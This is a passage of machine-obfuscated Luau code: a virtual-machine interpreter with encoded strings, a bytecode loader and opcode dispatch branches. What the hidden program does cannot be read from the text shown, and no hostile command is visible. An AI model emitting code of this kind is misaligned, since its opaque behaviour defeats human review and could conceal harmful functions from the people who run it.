bb(43647,-19135,44491),(yc)+251 else rf=Me;re_[2748]=rf;p(Ha,{});Nf=Ba[17213]or bb(46214,17213,33648)end else u_,Nf=nil,Ba[-26913]or bb(64398,-26913,31173)end elseif Nf<42402 then if Nf>41619 then u_=m[2748];Gb,t_=Bf(u_,30),r_(Bf(u_,20),1023);m[55530]=Se[t_+1];m[4910]=Gb if(Gb==2)then Nf=Ba[-26068]or bb(29740,-26068,100034)continue else Nf=Ba[-29309]or bb(44675,-29309,54135)continue end Nf=Ba[20952]or bb(35559,20952,75773)else sc,Nf=false,Ba[32168]or bb(61462,32168,28469)end elseif Nf>=42488 then if Nf>42488 then u_,Nf=vd(Gb,249),14293 continue else re_=0;oa,rf,Nf,Me=1,186,Ba[21453]or bb(50198,21453,19540),182 end else re_[59147]=r_(Bf(Zc,8),255);re_[47620]=r_(Bf(Zc,16),255);re_[49643],Nf=r_(Bf(Zc,24),255),Ba[16685]or bb(37256,16685,66867)end elseif Nf<=49852 then if Nf<47868 then if Nf<=46759 then Zc=Zc+ud;u_=Zc if Zc~=Zc then Nf=26034 else Nf=23513 end else Nf,u_=55034,nil end elseif Nf>=49142 then if Nf>49142 then if(t_)then Nf=Ba[345]or bb(718,345,55759)continue else Nf=Ba[20218]or bb(26619,20218,53263)continue end Nf=Ba[-11949]or bb(64971,-11949,19007)else if(Pb>=0 and bd>wc)or((Pb<0 or Pb~=Pb)and bd<wc)then Nf=Ba[14294]or bb(15658,14294,116372)else Nf=Ba[1945]or bb(34421,1945,24517)end end else if(rf>=0 and re_>Me)or((rf<0 or rf~=rf)and re_<Me)then Nf=Ba[-11247]or bb(41588,-11247,37059)else Nf=10838 end end elseif Nf<=51480 then if Nf>50860 then t_=0;Nf,rf,Me,re_=994,1,237,233 else t_=Db(md('\159\199','\163'),ue,Ef);Ef,Nf=Ef+8,9661 end else bd=Db(md('\177','\243'),ue,Ef);Nf,Ef=40837,Ef+1 end elseif Nf>=37597 then if Nf>38700 then if Nf>=40837 then if Nf>40837 then if(Se>=0 and kb>Bb)or((Se<0 or Se~=Se)and kb<Bb)then Nf=28428 else Nf=Ba[-1837]or bb(6045,-1837,85203)end else Nf,Se=27146,vd(bd,249)continue end elseif Nf>40417 then if ud==6 then Nf=Ba[-10220]or bb(30344,-10220,89219)continue elseif(ud==9)then Nf=Ba[-2279]or bb(51322,-2279,31609)continue else Nf=Ba[30822]or bb(2878,30822,69666)continue end Nf=Ba[3048]or bb(17341,3048,98135)else _a=Db(md('\254','\188'),ue,Ef);Ef,Nf=Ef+1,14253 end elseif Nf<=38112 then if Nf<37941 then Ud=Db(md('\210','\144'),ue,Ef);Nf,Ef=Ba[1803]or bb(47937,1803,64434),Ef+1 elseif Nf<=37941 then Me,Nf=rf,Ba[29119]or bb(30745,29119,109110)continue else re_,Me=r_(Bf(u_,10),1023),r_(Bf(u_,0),1023);m[20286]=Se[re_+1];m[31900],Nf=Se[Me+1],Ba[-5416]or bb(24924,-5416,98740)end elseif Nf<=38668 then Ud,Je,Nf=w_,nil,Ba[7045]or bb(64492,7045,48325)else m[55530]=Se[Ve(m[2748],0,24)+1];m[37631],Nf=Ve(m[2748],31,1)==1,Ba[31223]or bb(16244,31223,129900)end elseif Nf>34887 then if Nf>=36727 then if Nf>36727 then Nf=Ba[24483]or bb(48435,24483,36356)continue else bd=bd+Pb;Zc=bd if bd~=bd then Nf=57132 else Nf=Ba[-16996]or bb(39384,-16996,32647)end end elseif Nf>35258 then ed,Nf=nil,Ba[-19913]or bb(34498,-19913,17973)else Nf,m=3973,vd(ud,249)continue end elseif Nf>34619 then if Nf>34683 then if(sc)then Nf=Ba[30679]or bb(24917,30679,87391)continue else Nf=Ba[-10207]or bb(1538,-10207,81588)continue end Nf=Ba[3100]or bb(4813,3100,68686)else kb,Nf=vd(Bb,-1399206177),Ba[-773]or bb(38777,-773,76519)continue end elseif Nf>=34058 then if Nf>34058 then Nf,Je=Ba[24151]or bb(65300,24151,65488),vd(yc,-1399206177)continue else if ud==2 then Nf=Ba[-6688]or bb(14553,-6688,130050)continue elseif ud==1 then Nf=Ba[12159]or bb(29683,12159,72002)continue elseif(ud==6)then Nf=Ba[12183]or bb(20690,12183,97845)continue else Nf=Ba[8361]or bb(2687,8361,60180)continue end Nf=Ba[-18649]or bb(26113,-18649,51026)end else Nf=Ba[21274]or bb(56023,21274,57473)continue end elseif Nf>=58857 then if Nf>61811 then if Nf<=64370 then if Nf>=62770 then if Nf<63268 then sa,Nf,Mc=ed,Ba[12695]or bb(18821,12695,56604),nil elseif Nf<=63268 then Se,Nf=nil,51819 else if ud==0 then Nf=Ba[-8121]or bb(14487,-8121,120516)continue elseif ud==10 then Nf=Ba[-28718]or bb(30767,-28718,68309)continue end Nf=Ba[-7139]or bb(60246,-7139,67458)end elseif Nf<=61832 then sc,Nf=wc,Ba[-27685]or bb(333,-27685,73166)else Pb=Pb+m;ud=Pb if Pb~=Pb then Nf=Ba[7538]or bb(60996,7538,70928)else Nf=17133 end end elseif Nf>65158 then Nf=Ba[-6431]or bb(35064,-6431,49792)continue elseif Nf>65064 then Ea=_a;re_=ne(re_,ba(r_(Ea,127),(yb-182)*7))if not Dc(Ea,128)then Nf=Ba[5354]or bb(51725,5354,63859)continue end Nf=Ba[-27622]or bb(49073,-27622,61828)else Gb,Nf=W(Me),Ba[26340]or bb(22763,26340,49038)continue end elseif Nf<=60793 then if Nf<59672 then if Nf<=58967 then if Nf>58857 then Bb=kb;Se=pc(Bb);Nf,bd,wc,Pb=52593,114,(Bb)+113,1 else qc,Nf,w_=Mc,37597,nil end else Nf,Zc=Ba[7353]or bb(15743,7353,75180),vd(m,249)continue end elseif Nf<=60620 then if Nf>59672 then Zc=Db(md('T!\\','h'),ue,Ef);Ef,Nf=Ef+4,17784 else _a=yb;t_=ne(t_,ba(r_(_a,127),(oa-233)*7))if(not Dc(_a,128))then Nf=Ba[-28805]or bb(11131,-28805,92897)continue else Nf=Ba[-28781]or bb(36996,-28781,87244)continue end Nf=Ba[3319]or bb(33046,3319,74866)end else Me,rf=r_(Bf(Zc,8),16777215),nil;rf=if Me<8388608 then Me else Me-16777216;Nf,re_[53792]=Ba[5435]or bb(28519,5435,98132),rf end elseif Nf<=61660 then if Nf>61155 then Nf,Gb=53886,W(nil)elseif Nf>60977 then bd=bd+Pb;Zc=bd if bd~=bd then Nf=55225 else Nf=49142 end else if u_==8 then Nf=Ba[-22343]or bb(46847,-22343,35823)continue end Nf=Ba[-23807]or bb(15707,-23807,119136)end else re_=re_+rf;oa=re_ if re_~=re_ then Nf=Ba[-23922]or bb(53470,-23922,8809)else Nf=47868 end end elseif Nf<55135 then if Nf<=53886 then if Nf>53462 then if Nf>53849 then Nf,t_=Ba[-13088]or bb(24134,-13088,86921),nil else wc=bd;Pb=pc(wc);ud,m,Zc,Nf=1,(wc)+151,152,Ba[19747]or bb(56816,19747,23272)end elseif Nf<=52593 then if Nf>52060 then Zc=bd if wc~=wc then Nf=Ba[9992]or bb(55221,9992,58262)else Nf=5464 end else m[55530],Nf=Se[m[16270]+1],Ba[3244]or bb(1698,3244,107574)end else Nf,Pb[(u_-151)]=Ba[-13837]or bb(11163,-13837,102197),na()end elseif Nf<=54590 then if Nf<=54447 then m=Db(md('\176','\242'),ue,Ef);Nf,Ef=59292,Ef+1 else m[55530],Nf=Se[m[49643]+1],Ba[-27155]or bb(13099,-27155,118713)end else Gb=Db(md('\233','\171'),ue,Ef);Ef,Nf=Ef+1,Ba[16456]or bb(59203,16456,50080)end elseif Nf>=57097 then if Nf<57207 then if Nf>57097 then Pb,bd,Nf,wc=1,28,20311,(yc)+27 else re_=r_(Bf(u_,10),1023);Nf,m[20286]=Ba[-15132]or bb(47677,-15132,96471),Se[re_+1]end elseif Nf<=57796 then if Nf<=57207 then Nf=Ba[-18305]or bb(7272,-18305,81233)continue else Se=Se+wc;Pb=Se if Se~=Se then Nf=Ba[19106]or bb(1299,19106,89721)else Nf=774 end end else Nf,_a=65158,vd(Ea,249)continue end elseif Nf<56048 then if Nf<=55135 then Nf,bd=Ba[-30288]or bb(10999,-30288,109435),vd(wc,-1399206177)continue else Nf,bd=9140,nil end elseif Nf>56048 then Nf,m=32021,nil else Nf,Gb=Ba[-16290]or bb(10121,-16290,114070),W(nil)end end end local b_=na();fa_[1144][ue]=b_ return b_ end)local gf=(function(Nb,Oc)Nb=fb(Nb)local rb=Rc()local function zd(_e,Kf)local xf=(function(...)return{...},l_('#',...)end)local Ab;Ab=(function(Pd,mc,mf)if mc>mf then return end return Pd[mc],Ab(Pd,mc+1,mf)end)local function Zd(Z,h,Fd,Fc)local Qb,A,ce,hf,ic,se_,oc,Fe,ca,db,Hd,ge,Ga,o_,Md,pe,a_,we,xc,Xb,d_,lf,Ad,id;o_,Fe={},function(af,Ib,Lb)o_[Ib]=bc(af,48234)-bc(Lb,31117)return o_[Ib]end;a_=o_[32272]or Fe(8263,32272,65237)repeat if a_>=35648 then if a_>51253 then if a_<58871 then if a_>=56025 then if a_>57605 then if a_>=57770 then if a_<58447 then if a_<=57770 then if(Ga>8)then a_=o_[26173]or Fe(99147,26173,60044)continue else a_=o_[-9958]or Fe(18184,-9958,21910)continue end a_=o_[30989]or Fe(54063,30989,6746)else Ad=ca[59147];hf,A=Z[Ad],Z[Ad+1];id=Z[Ad+2]+A;Z[Ad+2]=id if(A>0)then a_=o_[31799]or Fe(56650,31799,11366)continue else a_=o_[27850]or Fe(124581,27850,60321)continue end a_=o_[-26335]or Fe(44594,-26335,32615)end elseif a_>58447 then A,id=Ad[55530],ca[55530];id=md('k\14|','\151')..id;ge='';a_,oc,se_,Qb=20335,1,(#A-1)+6,6 else d_+=1;a_=o_[-6982]or Fe(60728,-6982,15465)end elseif a_>57714 then d_+=ca[16270];a_=o_[5514]or Fe(26904,5514,45961)elseif a_<57658 then Ad,hf=ca[4910],ca[55530];A=rb[hf]or fa_[25420][hf]if(Ad==1)then a_=o_[16447]or Fe(17995,16447,65043)continue else a_=o_[2692]or Fe(126644,2692,8618)continue end a_=40871 elseif a_>57658 then if hb(hf)==md('\183M\161@\166','\195,')then a_=o_[15484]or Fe(130982,15484,60421)continue end a_=o_[722]or Fe(102377,722,40944)else if(Ga>16)then a_=o_[-17918]or Fe(8003,-17918,15939)continue else a_=o_[-30703]or Fe(52497,-30703,17697)continue end a_=o_[14303]or Fe(15773,14303,3844)end elseif a_>57055 then if a_>=57470 then if a_<=57470 then if(Ga>124)then a_=o_[-4888]or Fe(127230,-4888,36999)continue else a_=o_[-2311]or Fe(116710,-2311,39631)continue end a_=o_[16465]or Fe(44430,16465,32763)else a_=o_[24470]or Fe(9653,24470,10998)continue end elseif a_>57079 then hf,A,id=Ad[md('\188\169\1\151\147\26','\227\246h')](hf);a_=o_[-27579]or Fe(54775,-27579,17509)else Z[Ad+1]=oc;a_,ge=o_[-25525]or Fe(57281,-25525,24840),oc end elseif a_>56471 then if a_<=56714 then a_,ge=o_[11584]or Fe(54964,11584,10719),oc continue else Z[Ad+2]=Z[Ad+3];d_+=ca[16270];a_=o_[-27577]or Fe(3340,-27577,56437)end elseif a_>56150 then if(Ga>227)then a_=o_[-26706]or Fe(33051,-26706,23352)continue else a_=o_[13641]or Fe(2815,13641,56881)continue end a_=o_[-25822]or Fe(29296,-25822,47905)elseif a_<=56025 then if(Ga>145)then a_=o_[7152]or Fe(125951,7152,8501)continue else a_=o_[-12959]or Fe(28013,-12959,50577)continue end a_=o_[-3522]or Fe(60039,-3522,13042)else if Ga>87 then a_=o_[-12210]or Fe(97082,-12210,42041)continue else a_=o_[11211]or Fe(107993,11211,48799)continue end a_=o_[-6628]or Fe(16071,-6628,3762)end elseif a_>=52542 then if a_<=54854 then if a_<53879 then if a_>52542 then if Ga>7 then a_=o_[17650]or Fe(17009,17650,35616)continue else a_=o_[13354]or Fe(57319,13354,26521)continue end a_=o_[5693]or Fe(57650,5693,10343)else id,a_=nil,29857 end elseif a_<53934 then d_+=ca[16270];a_=o_[-31517]or Fe(49472,-31517,2097)elseif a_>53934 then if Ga>212 then a_=o_[18582]or Fe(93441,18582,37886)continue else a_=o_[-18478]or Fe(29202,-18478,15029)continue end a_=o_[-20779]or Fe(45664,-20779,31505)else Ad=Z[ca[47620]];a_,Z[ca[49643]]=o_[24980]or Fe(36884,24980,22685),if Ad then Ad else ca[55530]or false end elseif a_<55802 then if a_>55126 then ge,Qb=Xd(lf[ca],A,Z[Ad+1],Z[Ad+2])if not ge then a_=o_[-26572]or Fe(61330,-26572,20862)continue end a_=o_[22625]or Fe(23590,22625,3967)else Z[ca[49643]],a_=Z[ca[47620]][ca[59147]+1],o_[-24045]or Fe(35989,-24045,23580)end elseif a_>55802 then ub(Qb);a_,lf[ge]=o_[18027]or Fe(111461,18027,39639),nil else ca[43372]=238;d_+=1;a_=o_[-752]or Fe(36432,-752,24385)end elseif a_>=52256 then if a_>=52400 then if a_>52400 then Ad,hf,A=ca[55530],ca[37631],Z[ca[59147]]if(A==Ad)~=hf then a_=o_[-19547]or Fe(107803,-19547,45124)continue else a_=o_[11065]or Fe(31543,11065,59273)continue end a_=o_[-32303]or Fe(61448,-32303,14713)else a_,id=o_[-25150]or Fe(28279,-25150,49162),se_ continue end elseif a_>52256 then if(Hd>=0 and se_>oc)or((Hd<0 or Hd~=Hd)and se_<oc)then a_=o_[23804]or Fe(35958,23804,23843)else a_=o_[-16857]or Fe(108492,-16857,6128)end else d_+=1;a_=o_[-16939]or Fe(49928,-16939,2681)end elseif a_<=52035 then if a_>52024 then a_,id=o_[-16242]or Fe(16503,-16242,46002),nil elseif a_<=51363 then if hf<=id then a_=o_[-8276]or Fe(43238,-8276,27180)continue end a_=o_[22492]or Fe(39913,22492,26008)else if(ca[49643]==27)then a_=o_[-15060]or Fe(113117,-15060,55514)continue else a_=o_[-3325]or Fe(114662,-3325,32673)continue end a_=o_[-15110]or Fe(14118,-15110,1619)end else Z[ca[59147]],a_=A[ca[20286]][ca[31900]],o_[-23956]or Fe(129975,-23956,53691)end elseif a_>=60969 then if a_<=63655 then if a_<62831 then if a_>=61179 then if a_<62068 then if(Ga>248)then a_=o_[8455]or Fe(112771,8455,3978)continue else a_=o_[20343]or Fe(24822,20343,25173)continue end a_=o_[-2388]or Fe(4439,-2388,55362)elseif a_>62068 then Ad=ca[59147];hf,A=Z[Ad],nil;id=hf;A=ie(id)==md('\169\185\19\165\169\f','\199\204~')if not A then a_=o_[2250]or Fe(123397,2250,42350)continue end a_=39571 else da(Z,hf,hf+A-1,ca[2748],Z[Ad]);d_+=1;a_=o_[-1959]or Fe(38462,-1959,26475)end elseif a_>60969 then if Ga>113 then a_=o_[16272]or Fe(122392,16272,169)continue else a_=o_[-4701]or Fe(123707,-4701,54737)continue end a_=o_[19525]or Fe(14276,19525,63949)else a_,Z[ca[59147]]=o_[-16614]or Fe(61195,-16614,15998),#Z[ca[47620]]end elseif a_>63167 then if a_<=63286 then d_+=1;a_=o_[14452]or Fe(1357,14452,54324)else se_=se_+Hd;Xb=se_ if se_~=se_ then a_=o_[24783]or Fe(30864,24783,62932)else a_=12818 end end elseif a_<63015 then Qb,se_=hf[31900],ca[31900];se_=md('+N<','\215')..se_;oc='';Hd,a_,Xb,ic=152,25328,(#Qb-1)+152,1 elseif a_<=63015 then hf[20286],a_=id,o_[-15575]or Fe(79274,-15575,54859)else if(Z[ca[59147]]==Z[ca[2748]])then a_=o_[22307]or Fe(100851,22307,18414)continue else a_=o_[2312]or Fe(19609,2312,19348)continue end a_=o_[1288]or Fe(36627,1288,20870)end elseif a_>64493 then if a_<64864 then ca=Fd[d_];Ga,a_=ca[43372],o_[2071]or Fe(99570,2071,63565)elseif a_<=64864 then Ad=Kf[ca[47620]+1];Ad[3][Ad[1]],a_=Z[ca[59147]],o_[19085]or Fe(64199,19085,17074)else if Ga>161 then a_=o_[3853]or Fe(113394,3853,30292)continue else a_=o_[-17106]or Fe(46111,-17106,31150)continue end a_=o_[8184]or Fe(62120,8184,15065)end elseif a_<=64183 then if a_<64124 then oc=oc+Xb;ic=oc if oc~=oc then a_=o_[-22787]or Fe(109260,-22787,12411)else a_=2437 end elseif a_>64124 then if Ad==2 then a_=o_[-18775]or Fe(119814,-18775,38615)continue elseif(Ad==3)then a_=o_[-6610]or Fe(113039,-6610,16482)continue else a_=o_[12174]or Fe(115890,12174,41148)continue end a_=o_[-18938]or Fe(7026,-18938,32508)else if we==2 then a_=o_[29395]or Fe(6398,29395,18329)continue end a_=o_[-2947]or Fe(4293,-2947,7454)end elseif a_>64191 then if(Ga>73)then a_=o_[2439]or Fe(78920,2439,42764)continue else a_=o_[2892]or Fe(123362,2892,44764)continue end a_=o_[15854]or Fe(50127,15854,3514)else d_+=ca[16270];a_=o_[27335]or Fe(5102,27335,56731)end elseif a_<=59726 then if a_>59128 then if a_>59619 then if ca[49643]==136 then a_=o_[-10545]or Fe(24068,-10545,5215)continue elseif ca[49643]==158 then a_=o_[334]or Fe(125149,334,33607)continue else a_=o_[-30823]or Fe(9889,-30823,24624)continue end a_=o_[-29305]or Fe(1453,-29305,55252)elseif a_>59615 then Z[ca[59147]],a_=ca[55530],o_[709]or Fe(31488,709,49777)elseif a_<=59279 then ic=oc if Hd~=Hd then a_=o_[-11963]or Fe(100222,-11963,6121)else a_=2437 end else id=Z[Ad];a_,se_,ge,Qb=45506,1,Ad+1,hf end elseif a_>59078 then if a_>59122 then if ca[49643]==152 then a_=o_[-3821]or Fe(106892,-3821,6382)continue elseif ca[49643]==160 then a_=o_[-32676]or Fe(108721,-32676,41807)continue else a_=o_[-19371]or Fe(62670,-19371,14825)continue end a_=o_[-378]or Fe(14382,-378,347)else return Ab(Z,Ad,Ad+id-1)end elseif a_>=58981 then if a_>58981 then d_+=ca[16270];a_=o_[-2952]or Fe(41873,-2952,27904)else a_,id=o_[8374]or Fe(75594,8374,52643),hf-1 end else Z[ca[59147]],a_=not Z[ca[47620]],o_[25327]or Fe(59962,25327,13167)end elseif a_>60418 then if a_>=60809 then if a_>60809 then d_+=1;a_=o_[28275]or Fe(42759,28275,30322)else Ad,hf=nil,vd(ca[11057],42323);Ad=if hf<32768 then hf else hf-65536;A=Ad;id=h[A+1];ge=id[50097];Qb=pc(ge);Z[vd(ca[59147],128)]=zd(id,Qb);a_,se_,oc,Hd=26546,118,(ge)+117,1 end else a_,Qb=o_[-2880]or Fe(66534,-2880,49000),Qb..Hc(vd(Pe(id,(Xb-38)+1),Pe(ge,(Xb-38)%#ge+1)))end elseif a_>=60043 then if a_>=60051 then if a_>60051 then if Z[ca[59147]]<Z[ca[2748]]then a_=o_[-17991]or Fe(65035,-17991,14796)continue else a_=o_[-10301]or Fe(120215,-10301,36468)continue end a_=o_[30276]or Fe(12418,30276,63735)else Ad,hf,A=ca[47620],ca[49643],ca[55530];id=Z[hf];Z[Ad+1]=id;Z[Ad]=id[A];d_+=1;a_=o_[-21293]or Fe(55278,-21293,6555)end else d_+=ca[16270];a_=o_[-16065]or Fe(36554,-16065,24255)end elseif a_<=59804 then Ad,hf,A=ca[49643],ca[59147],ca[47620]-1 if(A==-1)then a_=o_[4285]or Fe(73888,4285,35384)continue else a_=o_[-29667]or Fe(72574,-29667,52525)continue end a_=62068 else d_-=1;Fd[d_],a_={[43372]=217,[59147]=vd(ca[59147],41),[47620]=vd(ca[47620],128),[49643]=0},o_[-2056]or Fe(40136,-2056,27833)end elseif a_>43688 then if a_>=46775 then if a_>=48259 then if a_<=49902 then if a_<49314 then if a_<=48259 then d_-=1;a_,Fd[d_]=o_[-10723]or Fe(17293,-10723,36340),{[43372]=228,[59147]=vd(ca[59147],184),[47620]=vd(ca[47620],109),[49643]=0}else d_+=ca[16270];a_=o_[18150]or Fe(38999,18150,24898)end elseif a_>=49348 then if a_<=49348 then a_,Z[ca[49643]][Z[ca[59147]]]=o_[22413]or Fe(24102,22413,44883),Z[ca[47620]]else d_+=ca[16270];a_=o_[31519]or Fe(64070,31519,17203)end else ce={[1]=db,[3]=Z};Md[db],a_=ce,o_[-14113]or Fe(54100,-14113,32633)end elseif a_>50835 then Ad,hf=ca[59147],ca[55530];pe=Ad+6;A,id=Z[Ad],nil;id=ie(A)==md('\r\202\224\143\31\214\225\130','k\191\142\236')if id then a_=o_[2433]or Fe(98856,2433,58604)continue else a_=o_[-21730]or Fe(99755,-21730,7087)continue end a_=o_[-23238]or Fe(10025,-23238,63064)elseif a_>=50636 then if a_>50636 then d_-=1;a_,Fd[d_]=o_[-24639]or Fe(7520,-24639,60433),{[43372]=122,[59147]=vd(ca[59147],139),[47620]=vd(ca[47620],142),[49643]=0}else d_+=1;a_=o_[-12154]or Fe(63576,-12154,16713)end else a_,Z[ca[47620]]=o_[-2216]or Fe(41934,-2216,28091),Z[ca[59147]]%Z[ca[49643]]end elseif a_<47308 then if a_>46839 then d_+=ca[16270];a_=o_[-1749]or Fe(36517,-1749,24300)elseif a_>46808 then if(Ga>41)then a_=o_[-13583]or Fe(113534,-13583,64440)continue else a_=o_[436]or Fe(116682,436,48057)continue end a_=o_[10663]or Fe(51533,10663,4148)elseif a_<=46775 then a_,pe=o_[18772]or Fe(102190,18772,34850),Ad+se_-1 else xc=false;d_+=1 if Ga>130 then a_=o_[-24494]or Fe(979,-24494,23918)continue else a_=o_[-12917]or Fe(103279,-12917,48555)continue end a_=o_[-10724]or Fe(44285,-10724,31908)end elseif a_<=47720 then if a_>=47468 then if a_<=47468 then if(Ga>36)then a_=o_[28784]or Fe(112905,28784,9016)continue else a_=o_[5633]or Fe(112561,5633,49319)continue end a_=o_[16891]or Fe(9344,16891,62705)else if(not Z[ca[59147]])then a_=o_[-29373]or Fe(75712,-29373,51346)continue else a_=o_[6682]or Fe(57565,6682,10436)continue end a_=o_[-31461]or Fe(25707,-31461,46366)end else if(ca[49643]==218)then a_=o_[28112]or Fe(21653,28112,3787)continue else a_=o_[-6783]or Fe(12751,-6783,6242)continue end a_=o_[564]or Fe(63879,564,17394)end else Ad,hf=ca[59147],ca[47620]-1 if hf==-1 then a_=o_[-30219]or Fe(114653,-30219,8468)continue end a_=o_[-29836]or Fe(61978,-29836,31578)end elseif a_<44069 then if a_>43872 then if a_>=44028 then if a_<=44028 then a_,se_=o_[-1381]or Fe(20144,-1381,51400),A-1 else if(Ga>9)then a_=o_[-12805]or Fe(101446,-12805,44728)continue else a_=o_[9688]or Fe(54174,9688,15900)continue end a_=o_[-17974]or Fe(35271,-17974,21426)end else if(we==1)then a_=o_[-18563]or Fe(23529,-18563,10756)continue else a_=o_[-15355]or Fe(80528,-15355,62963)continue end a_=o_[-27416]or Fe(17548,-27416,51527)end elseif a_>=43800 then if a_>43806 then if(Hd==2)then a_=o_[-11285]or Fe(2514,-11285,21780)continue else a_=o_[-6604]or Fe(129299,-6604,51248)continue end a_=o_[8700]or Fe(115144,8700,36971)elseif a_<=43800 then lf[ca]=nil;d_+=1;a_=o_[23364]or Fe(37775,23364,24058)else hf=Fc[6878];pe,a_=Ad+hf-1,o_[9665]or Fe(3554,9665,7266)end elseif a_<=43694 then Ad,hf=nil,Z[ca[59147]];Ad=ie(hf)==md("-\252\186\'?\224\187*",'K\137\212D')if(not Ad)then a_=o_[28696]or Fe(37765,28696,26454)continue else a_=o_[-7466]or Fe(73334,-7466,42659)continue end a_=o_[-26885]or Fe(112111,-26885,16154)else ge,Qb=hf(A,id);id=ge if id==nil then a_=o_[-17037]or Fe(19862,-17037,48078)else a_=36039 end end elseif a_>44651 then if a_>45813 then if(oc>=0 and Qb>se_)or((oc<0 or oc~=oc)and Qb<se_)then a_=o_[-19533]or Fe(2246,-19533,63921)else a_=33995 end elseif a_>=45506 then if a_<=45506 then oc=ge if Qb~=Qb then a_=o_[1943]or Fe(23902,1943,1905)else a_=3347 end else if(Ga>96)then a_=o_[30149]or Fe(18155,30149,62131)continue else a_=o_[-18294]or Fe(99847,-18294,52691)continue end a_=o_[-5430]or Fe(65067,-5430,20318)end else d_+=ca[16270];a_=o_[-7566]or Fe(58496,-7566,13553)end elseif a_<=44489 then if a_>44329 then hf,A,id=Ad[md('dc{OY\96',';<\18')](hf);a_=o_[6879]or Fe(24786,6879,63039)elseif a_>44069 then ic=Fd[d_];d_+=1;we=ic[59147]if(we==0)then a_=o_[-8334]or Fe(7304,-8334,63614)continue else a_=o_[16828]or Fe(108163,16828,5776)continue end a_=o_[30187]or Fe(113552,30187,50771)else oc=oc+Xb;ic=oc if oc~=oc then a_=o_[-11199]or Fe(106733,-11199,65473)else a_=18773 end end elseif a_>44612 then hf,A,id=Ad[md('\163\240\212\136\202\207','\252\175\189')](hf);a_=o_[317]or Fe(23790,317,19532)else hf,A,id=wb(hf);a_=o_[26366]or Fe(30784,26366,3753)end elseif a_>=39571 then if a_<=42626 then if a_<=40871 then if a_>40645 then if a_<=40679 then if Ga>62 then a_=o_[20038]or Fe(128173,20038,8883)continue else a_=o_[7258]or Fe(58759,7258,22629)continue end a_=o_[20054]or Fe(37696,20054,23089)else d_+=1;a_=o_[25181]or Fe(39239,25181,24626)end elseif a_<40163 then if a_>39571 then if Ga>207 then a_=o_[-14344]or Fe(4419,-14344,24497)continue else a_=o_[-22699]or Fe(19637,-22699,39228)continue end a_=o_[14878]or Fe(11419,14878,64526)else ge,Qb=Z[Ad+1],nil;se_=ge;Qb=ie(se_)==md('\242\167\209\254\183\206','\156\210\188')if(not Qb)then a_=o_[22721]or Fe(18564,22721,42037)continue else a_=o_[-16138]or Fe(25160,-16138,60273)continue end a_=19238 end elseif a_<=40163 then d_+=ca[16270];a_=o_[-7969]or Fe(111939,-7969,33846)else if Ga>217 then a_=o_[7346]or Fe(55387,7346,11154)continue else a_=o_[-5017]or Fe(25197,-5017,32332)continue end a_=o_[-4131]or Fe(7747,-4131,61238)end elseif a_>=42594 then if a_<=42594 then se_,a_=se_..Hc(vd(Pe(ge,(ic-213)+1),Pe(Qb,(ic-213)%#Qb+1))),o_[18770]or Fe(75122,18770,38270)else d_-=1;a_,Fd[d_]=o_[17784]or Fe(53766,17784,7027),{[43372]=209,[59147]=vd(ca[59147],68),[47620]=vd(ca[47620],240),[49643]=0}end elseif a_>41185 then if(hb(hf)==md('v\219\96\214g','\2\186'))then a_=o_[-14493]or Fe(59182,-14493,24463)continue else a_=o_[23693]or Fe(101712,23693,65530)continue end a_=o_[-26804]or Fe(124450,-26804,54792)else ge={A(Z[Ad+1],Z[Ad+2])};da(ge,1,hf,Ad+3,Z)if(Z[Ad+3]~=nil)then a_=o_[25167]or Fe(71469,25167,46565)continue else a_=o_[-19839]or Fe(27874,-19839,52551)continue end a_=o_[3019]or Fe(18723,3019,36950)end elseif a_>=43285 then if a_<=43618 then if a_>=43425 then if a_>43425 then if(Ga>122)then a_=o_[-20799]or Fe(127523,-20799,5190)continue else a_=o_[-5465]or Fe(105203,-5465,16838)continue end a_=o_[-9274]or Fe(28006,-9274,48147)else Ad,hf=nil,Z[ca[59147]];Ad=ie(hf)==md('\132B\199a\150^\198l','\226\55\169\2')if not Ad then a_=o_[-7496]or Fe(12947,-7496,1665)continue end a_=o_[-19447]or Fe(127779,-19447,36399)end else A,a_=pe-hf+1,o_[30742]or Fe(71936,30742,52091)end else if Ga>29 then a_=o_[-29111]or Fe(117482,-29111,50692)continue else a_=o_[4872]or Fe(5090,4872,716)continue end a_=o_[-16198]or Fe(36847,-16198,20890)end elseif a_>=43055 then if a_>43055 then Ad,hf,A=ca[55530],ca[37631],Z[ca[59147]]if((A==Ad)~=hf)then a_=o_[9233]or Fe(115459,9233,33522)continue else a_=o_[-13997]or Fe(68403,-13997,37556)continue end a_=o_[-27081]or Fe(52108,-27081,5621)else if Ga>80 then a_=o_[13661]or Fe(81541,13661,56852)continue else a_=o_[-23185]or Fe(87004,-23185,35396)continue end a_=o_[-31278]or Fe(4406,-31278,55395)end elseif a_<=42952 then d_+=ca[16270];a_=o_[-19468]or Fe(19987,-19468,40582)else if Ga>202 then a_=o_[26669]or Fe(52566,26669,30166)continue else a_=o_[-19615]or Fe(129691,-19615,63400)continue end a_=o_[-19225]or Fe(55780,-19225,9133)end elseif a_>38400 then if a_<38984 then if a_>38759 then Ad,hf,A=vd(ca[59147],149),vd(ca[49643],184),vd(ca[47620],17);id,ge=hf==0 and pe-Ad or hf-1,Z[Ad];Qb,se_=xf(ge(Ab(Z,Ad+1,Ad+id)))if A==0 then a_=o_[-20047]or Fe(80428,-20047,46594)continue else a_=o_[23600]or Fe(130937,23600,61082)continue end a_=o_[-7286]or Fe(28112,-7286,59816)elseif a_<38463 then a_,id=63015,se_ continue elseif a_<=38463 then Ad,hf=Z[ca[59147]],nil;hf=ie(Ad)==md('\147!\177q\129=\176|','\245T\223\18')if(not hf)then a_=o_[1659]or Fe(22023,1659,54965)continue else a_=o_[30831]or Fe(130399,30831,56799)continue end a_=40163 else d_-=1;Fd[d_],a_={[43372]=7,[59147]=vd(ca[59147],31),[47620]=vd(ca[47620],180),[49643]=0},o_[-32291]or Fe(3881,-32291,56920)end elseif a_<=39383 then if a_<=38986 then if a_>38984 then if(ca[49643]==90)then a_=o_[10658]or Fe(96619,10658,41799)continue else a_=o_[-18403]or Fe(22907,-18403,45451)continue end a_=o_[26474]or Fe(25473,26474,44528)else Ad,hf=ca[49643],ca[59147];A,id=v(j,Z,'',Ad,hf)if(not A)then a_=o_[27245]or Fe(68554,27245,46924)continue else a_=o_[-4094]or Fe(30979,-4094,6844)continue end a_=25144 end else if not(oc<=hf)then a_=o_[15076]or Fe(99352,15076,63982)continue end a_=o_[-20927]or Fe(62988,-20927,18293)end else d_+=1;a_=o_[25016]or Fe(360,25016,51225)end elseif a_<=37049 then if a_>36578 then if a_<=36899 then Ad[55530]=hf;ca[43372],a_=192,o_[13812]or 